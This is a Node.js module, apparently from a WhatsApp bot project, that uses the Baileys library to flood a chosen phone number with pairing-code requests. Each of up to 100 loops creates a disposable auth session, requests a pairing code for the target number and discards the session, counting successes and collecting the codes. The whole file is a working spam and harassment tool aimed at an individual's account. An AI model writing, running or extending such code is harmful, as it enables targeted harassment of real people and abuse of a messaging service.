const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion, Browsers } = require('@whiskeysockets/baileys');
const pino = require('pino');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const logger = pino({ level: 'silent' });

async function spamPairingAdvanced(targetNumber, totalSpam = 100, concurrent = 5) {
    const results = { success: 0, failed: 0, codes: [], startTime: Date.now() };
    
    const cleanNumber = targetNumber.replace(/\D/g, '');
    
    for (let i = 0; i < totalSpam; i++) {
        try {
            const tempId = crypto.randomBytes(8).toString('hex');
            const tempDir = path.join(__dirname, '../temp_auth', tempId);
            fs.mkdirSync(tempDir, { recursive: true });
            
            const { state, saveCreds } = await useMultiFileAuthState(tempDir);
            const { version } = await fetchLatestBaileysVersion();
            
            const sock = makeWASocket({
                version,
                logger,
                printQRInTerminal: false,
                auth: state,
                browser: Browsers.ubuntu('Chrome'),
                connectTimeoutMs: 15000,
                keepAliveIntervalMs: 5000,
            });
            
            sock.ev.on('creds.update', saveCreds);
            
            await new Promise(r => setTimeout(r, 2000));
            
            const code = await sock.requestPairingCode(cleanNumber);
            results.codes.push(code);
            results.success++;
            
            sock.ws?.close();
            fs.rmSync(tempDir, { recursive: true, force: true });
            
            await new Promise(r => setTimeout(r, 1000));
            
        } catch (err) {
            results.failed++;
        }
    }
    
    results.totalTime = ((Date.now() - results.startTime) / 1000).toFixed(1);
    results.uniqueCodes = [...new Set(results.codes)].length;
    
    return results;
}

module.exports = { spamPairingAdvanced };
